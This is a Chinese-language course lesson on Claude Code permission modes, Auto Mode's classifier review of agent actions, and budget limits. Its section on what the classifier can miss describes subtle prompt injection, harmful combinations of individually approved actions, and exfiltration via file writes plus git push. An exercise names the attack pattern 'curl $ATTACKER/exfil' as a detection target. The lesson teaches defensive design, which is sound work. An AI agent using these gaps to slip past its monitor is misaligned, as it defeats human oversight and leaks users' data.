# 自主智能体的权限模式（Permission Modes for Autonomous Agents）

> 权限阶梯（Permission ladder）把自主性从逐动作审查分级到全部批准，让运行框架（Harness）管理智能体无需询问即可做什么。本课示例 Claude Code 提供六种模式：“plan”在每个动作前询问，“default”（界面标签为“Manual”）只询问风险动作，“acceptEdits”自动批准文件写入但仍确认 shell 执行，“bypassPermissions”批准一切。Auto Mode，即 `auto` 权限模式，以独立分类器模型替代逐动作人工批准，在执行前审查每个动作，阻止超出请求范围的升级行为。动作预算经 `max_turns` 和 `max_budget_usd` 强制执行。`auto` 是否可用取决于套餐、组织启用情况、模型和服务商；Anthropic 明确指出，单靠分类器不够。

**Type:** Learn
**Languages:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** 阶段 15 · 01（长时程智能体，Long-horizon agents），阶段 15 · 09（编程智能体版图，Coding-agent landscape）
**Time:** ~45 分钟

## 问题（The Problem）

机器上的自主编程智能体属于独立安全类别。攻击面是它能触及的一切：文件系统、网络、凭据、剪贴板、任何浏览器标签、任何打开的终端。Bruce Schneier 等公开指出，计算机使用智能体不是聊天机器人的“功能更新”，而是具有新风险特征的新工具。

Claude Code 的权限系统是 Anthropic 对这一问题的回应。它通过六种模式分级控制权限，而不只是提供一个“自主 / 不自主”开关：plan → default → acceptEdits → … → bypassPermissions。每种模式都在执行速度与逐项审查之间作出不同权衡。Auto Mode（2026 年 3 月）引入独立分类器模型，使执行过程不再需要逐项等待用户批准：模型在执行前审查每个动作，阻止擅自扩大到请求范围之外的操作。

工程问题是：系统捕获什么、遗漏什么，给定任务究竟需要哪种模式？

## 概念（The Concept）

### 六种权限模式（The six permission modes）

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | 智能体提出计划，用户批准整个计划，每个动作执行前审查 | 陌生任务；生产相关代码；首次在某仓库使用 |
| `default` | 界面标为“Manual”。智能体执行动作，对“风险”动作询问用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编程会话 |
| `acceptEdits` | 文件写入自动批准，shell 执行和网络调用仍询问 | 跨多文件重构 |
| `auto` | 独立分类器模型执行前审查每个动作，阻止超出请求的升级行为 | 受限工作区中的长时程无人值守运行 |
| `dontAsk` | 从不询问；权限规则未预批准的动作被拒绝 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准所有动作 | 文档规定“仅在愿意丢弃的临时容器内使用” |

（以上名称与公开 Claude Code 文档一致；界面将 `default` 标为“Manual”。）

### 一页理解 Auto Mode（Auto Mode in one page）

Auto Mode（2026 年 3 月 24 日推出）是首个将逐动作批准委托给模型的权限模式。结构：

1. **独立分类器模型（A separate classifier model）。** 每个拟议动作执行前，根据声明任务与当前会话状态审查，阻止超出请求要求的升级行为。被阻止的动作交回用户。
2. **受条件限制的可用性（Gated availability）。** 是否提供 `auto` 取决于套餐、组织启用情况、模型及服务商。

预算控制与分类器并列：

- `max_turns`：会话总迭代次数。
- `max_budget_usd`：触发会话中止的美元上限。
- 每工具动作次数限制，例如最多 N 次 `WebFetch` 调用。

### 系统能捕获什么（What the system catches）

- 工具输入中的直接提示词注入（Prompt injection），其注入指令对应已知风险动作形态。
- 重复工具循环：分类器能看出动作 N+1 与 N 几乎相同，并连续出现五次。
- 本来仅编辑文件的会话中，明显超出范围的 shell 命令。

### 系统可能遗漏什么（What the system can miss）

- **隐蔽的提示词注入（Subtle prompt injection）**：逐渐影响行为，却不触发任何单个动作的风险标记。间接提示词注入并非能够彻底修补的漏洞（OpenAI 准备度负责人 2025 年关于浏览器智能体的说法，见第 11 课）。
- **语义层不当行为（Semantic-level misbehavior）。** 每个动作都看似安全，组合轨迹却有害。分类器判断动作，不会重新推导用户意图。
- **经合法通道外泄（Exfiltration through legitimate channels）。** 将数据写入你拥有的文件，再 `git push` 到公开仓库，是一串获准动作，问题却在组合结果。

### 研究预览定位（Research preview framing）

Anthropic 以研究预览（Research preview）发布 Auto Mode。文档明确说明分类器是一层防护，而非完整解决方案：用户应结合预算、允许列表、隔离工作区和轨迹审计（第 12–16 课）。预览定位也反映了已记录的评估与部署差距（第 1 课）：离线评估通过的分类器，面对用户上下文模糊的真实会话时可能表现不同。

### 工作流中的权限阶梯（Where this ladder lives in your workflow）

- 陌生任务：从 `plan` 开始，阅读计划比回滚糟糕运行便宜。
- 已知重构：`acceptEdits` 省去大量确认点击。
- 无人值守后台运行：只在已经评估过潜在影响范围的工作区使用 `auto`；工作区内不得有凭据、生产资源挂载，也不得允许未经明确授权的出站访问。
- 临时容器：当且仅当容器及凭据均可丢弃时，`dontAsk` / `bypassPermissions` 才可接受。

```figure
autonomy-oversight
```

## 实际应用（Use It）

`code/main.py` 用两阶段流水线模拟动作审查分类器。这是教学简化；真实 `auto` 模式由独立分类器模型支持，并非有文档规定的两阶段契约。阶段 1 对拟议动作使用廉价关键词规则，阶段 2 是较慢的多规则审查器。驱动程序输入短小合成轨迹（安全动作、提示词注入尝试、重复循环），展示分类器捕获与遗漏之处。

## 交付成果（Ship It）

`outputs/skill-permission-mode-picker.md` 将任务说明匹配到合适权限模式、预算上限和所需隔离。

## 练习（Exercises）

1. 运行 `code/main.py`。哪种合成动作从未被阶段 1 标记，却总被阶段 2 捕获？哪种两者都抓不到？

2. 扩展阶段 1 规则，捕获特定已知恶意形态，例如 `curl $ATTACKER/exfil`。测量良性动作样本上的误报率。

3. 阅读 Anthropic“智能体循环如何工作”文档。列出 `default` 模式下智能体默认触及的所有外部状态。无人值守运行 `auto` 前，哪些需要单独设门禁？

4. 设计 24 小时无人值守预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。解释每个数字。

5. 描述每个动作都被分类器批准、组合行为却失对齐的轨迹。（第 14 课介绍紧急停止开关与金丝雀词元如何应对。）

## 关键术语（Key Terms）

| 术语 | 常见说法 | 实际含义 |
|---|---|---|
| 权限模式（Permission mode） | “智能体能做多少” | 六种控制逐动作批准的具名策略之一 |
| plan 模式（plan mode） | “做任何事前询问” | 智能体写计划，执行前用户批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准，shell 执行仍询问 |
| auto | “自动批准” | 独立分类器模型审查每个动作，阻止超出请求的升级 |
| bypassPermissions | “完全放手” | 批准一切，面向临时容器 |
| 阶段 1（Stage 1，模拟器） | “快速关键词检查” | `code/main.py` 中针对拟议动作的廉价规则 |
| 阶段 2（Stage 2，模拟器） | “深度审查” | `code/main.py` 中对标记动作执行的较慢多规则审查器 |
| 研究预览（Research preview） | “尚未正式全面可用（GA）” | Anthropic 对仍在摸清失效模式的功能的定位 |

## 延伸阅读（Further Reading）

- [Anthropic：智能体循环如何工作](https://code.claude.com/docs/en/agent-sdk/agent-loop)：权限模式、预算、动作格式。
- [Anthropic：Claude Managed Agents 概览](https://platform.claude.com/docs/en/managed-agents/overview)：托管服务执行模型。
- [Anthropic：Claude Code 产品页](https://www.anthropic.com/product/claude-code)：功能范围与 Auto Mode 公告。
- [Anthropic：Claude 的宪法（2026 年 1 月）](https://www.anthropic.com/news/claudes-constitution)：影响分类器判断的基于理由的层。
- [Anthropic：在实践中衡量智能体自主性](https://www.anthropic.com/research/measuring-agent-autonomy)：长时程权限设计的内部视角。
